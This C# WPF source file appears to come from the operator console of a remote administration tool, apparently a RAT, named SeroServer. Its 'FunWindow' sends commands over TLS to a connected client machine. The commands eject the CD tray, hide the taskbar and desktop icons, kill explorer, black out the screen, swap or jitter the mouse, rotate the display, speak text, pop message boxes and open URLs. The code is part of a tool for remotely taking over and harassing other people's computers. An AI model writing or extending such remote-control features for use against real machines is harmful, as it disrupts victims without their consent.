using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class FunWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;

    // Toggle highlight colors
    private static readonly SolidColorBrush _activeGreen  = new(Color.FromRgb(0x15, 0x40, 0x22));
    private static readonly SolidColorBrush _activeRed    = new(Color.FromRgb(0x40, 0x15, 0x15));
    private static readonly SolidColorBrush _activeOrange = new(Color.FromRgb(0x40, 0x30, 0x10));
    private static readonly SolidColorBrush _dim          = new(Color.FromRgb(0x0E, 0x0F, 0x1A));

    private void Activate(Button active, SolidColorBrush color, params Button[] others)
    {
        active.Background = color;
        foreach (var b in others) b.Background = _dim;
    }

    public FunWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;

        _server.RegisterHandler(clientId, PacketType.FunResult, pkt =>
        {
            var r = JsonConvert.DeserializeObject<FunResultData>(pkt.Data);
            Dispatcher.Invoke(() => TxtStatus.Text = $"{r?.Action}: {r?.Result}");
        });
        Closed += (_, _) => _server.UnregisterHandler(clientId, PacketType.FunResult);
    }

    private async Task Send(string action, string param = "")
    {
        TxtStatus.Text = $"Sending: {action}…";
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.FunCmd,
            Data = JsonConvert.SerializeObject(new FunCmdData { Action = action, Param = param })
        });
    }

    private async void CdOpen_Click(object s, RoutedEventArgs e)           => await Send("cd_open");
    private async void CdClose_Click(object s, RoutedEventArgs e)          => await Send("cd_close");

    private async void TaskbarShow_Click(object s, RoutedEventArgs e)
    { Activate(BtnTaskbarShow, _activeGreen, BtnTaskbarHide); await Send("taskbar_show"); }
    private async void TaskbarHide_Click(object s, RoutedEventArgs e)
    { Activate(BtnTaskbarHide, _activeRed, BtnTaskbarShow); await Send("taskbar_hide"); }

    private async void ExplorerKill_Click(object s, RoutedEventArgs e)     => await Send("explorer_kill");
    private async void ExplorerStart_Click(object s, RoutedEventArgs e)    => await Send("explorer_start");

    private async void ScreenOn_Click(object s, RoutedEventArgs e)
    { Activate(BtnScreenOn, _activeGreen, BtnScreenOff); await Send("screen_on"); }
    private async void ScreenOff_Click(object s, RoutedEventArgs e)
    { Activate(BtnScreenOff, _activeRed, BtnScreenOn); await Send("screen_off"); }

    private async void ClockShow_Click(object s, RoutedEventArgs e)
    { Activate(BtnClockShow, _activeGreen, BtnClockHide); await Send("clock_show"); }
    private async void ClockHide_Click(object s, RoutedEventArgs e)
    { Activate(BtnClockHide, _activeRed, BtnClockShow); await Send("clock_hide"); }
    private async void TrayShow_Click(object s, RoutedEventArgs e)
    { Activate(BtnTrayShow, _activeGreen, BtnTrayHide); await Send("tray_show"); }
    private async void TrayHide_Click(object s, RoutedEventArgs e)
    { Activate(BtnTrayHide, _activeRed, BtnTrayShow); await Send("tray_hide"); }

    private async void DesktopIconsShow_Click(object s, RoutedEventArgs e)
    { Activate(BtnDesktopIconsShow, _activeGreen, BtnDesktopIconsHide); await Send("desktopicons_show"); }
    private async void DesktopIconsHide_Click(object s, RoutedEventArgs e)
    { Activate(BtnDesktopIconsHide, _activeRed, BtnDesktopIconsShow); await Send("desktopicons_hide"); }

    private async void MouseNormal_Click(object s, RoutedEventArgs e)
    { Activate(BtnMouseNormal, _activeGreen, BtnMouseSwap); await Send("mouse_normal"); }
    private async void MouseSwap_Click(object s, RoutedEventArgs e)
    { Activate(BtnMouseSwap, _activeRed, BtnMouseNormal); await Send("mouse_swap"); }

    private async void VolUp_Click(object s, RoutedEventArgs e)            => await Send("volume_up");
    private async void VolDown_Click(object s, RoutedEventArgs e)          => await Send("volume_down");
    private async void VolMute_Click(object s, RoutedEventArgs e)          => await Send("volume_mute");

    private async void Flip0_Click(object s, RoutedEventArgs e)
    { Activate(BtnFlip0, _activeGreen, BtnFlip90, BtnFlip180, BtnFlip270); await Send("flip_screen", "0"); }
    private async void Flip90_Click(object s, RoutedEventArgs e)
    { Activate(BtnFlip90, _activeOrange, BtnFlip0, BtnFlip180, BtnFlip270); await Send("flip_screen", "90"); }
    private async void Flip180_Click(object s, RoutedEventArgs e)
    { Activate(BtnFlip180, _activeOrange, BtnFlip0, BtnFlip90, BtnFlip270); await Send("flip_screen", "180"); }
    private async void Flip270_Click(object s, RoutedEventArgs e)
    { Activate(BtnFlip270, _activeOrange, BtnFlip0, BtnFlip90, BtnFlip180); await Send("flip_screen", "270"); }

    private async void Speak_Click(object s, RoutedEventArgs e)
        => await Send("speak", TxtSpeak.Text);

    private async void MsgBox_Click(object s, RoutedEventArgs e)
        => await Send("msgbox", TxtMsgBox.Text);

    private async void CrazyMouse_Click(object s, RoutedEventArgs e)
        => await Send("crazy_mouse", TxtCrazyMouseSec.Text);

    private async void OpenUrl_Click(object s, RoutedEventArgs e)
        => await Send("open_url", TxtUrl.Text.Trim());

    private bool _max;
    private void BtnMax_Click(object s, RoutedEventArgs e)
    {
        _max = !_max;
        WindowState = _max ? WindowState.Maximized : WindowState.Normal;
        BtnMaxFun.Content = _max ? "❐" : "☐";
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized) DragMove();
    }

    private void ResizeGrip_DragDelta(object s, System.Windows.Controls.Primitives.DragDeltaEventArgs e)
    {
        Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
        Height = Math.Max(MinHeight, Height + e.VerticalChange);
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}
